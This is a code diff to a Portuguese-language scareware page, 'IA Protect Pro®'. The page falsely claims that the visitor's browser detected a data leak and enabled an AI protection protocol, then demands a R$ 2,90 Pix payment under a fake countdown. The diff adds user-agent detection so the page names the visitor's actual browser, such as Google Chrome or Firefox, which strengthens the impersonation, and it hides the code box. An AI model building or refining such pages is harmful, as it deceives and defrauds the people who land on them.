@@ -2,8 +2,8 @@
 <html lang="pt-BR">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>IA Protect Pro®</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -38,12 +38,7 @@
       max-width: 220px;
     }
     .code-box {
-      margin-top: 20px;
-      background-color: #eee;
-      padding: 10px;
-      display: inline-block;
-      font-family: monospace;
-      border-radius: 4px;
+      display: none;
     }
     .timer {
       margin-top: 20px;
@@ -55,7 +50,7 @@
   <div class="logo">🔒 IA Protect Pro®</div>
   <h2>Segurança de conexão ativada</h2>
   <p class="alert">⚠️ Vazamento de dados em potencial detectado.</p>
-  <p>O navegador <strong>Google Chrome</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
+  <p>O navegador <strong id="browser-name">seu navegador</strong> ativou automaticamente o protocolo <strong>IA Protect Pro®</strong>, com tecnologia baseada em Inteligência Artificial.</p>
   <p>Para concluir a proteção em tempo real e garantir estabilidade durante sua navegação, realize a autenticação abaixo:</p>
   <h3>Valor único de verificação: R$ 2,90</h3>
   <p>(IA Protect opera por menos de $0.55 USD internacionalmente)</p>
@@ -71,6 +66,16 @@
   <p class="timer">⏳ Sua autenticação expira em 59 segundos.</p>
 
   <script>
+    // Detecta navegador
+    const browser = navigator.userAgent;
+    let name = "seu navegador";
+    if (browser.includes("Chrome")) name = "Google Chrome";
+    else if (browser.includes("Firefox")) name = "Mozilla Firefox";
+    else if (browser.includes("Safari")) name = "Safari";
+    else if (browser.includes("Edg")) name = "Microsoft Edge";
+    document.getElementById("browser-name").textContent = name;
+
+    // Cópia Pix
     function copyPix() {
       const text = document.getElementById("pixKey").innerText;
       navigator.clipboard.writeText(text).then(() => {
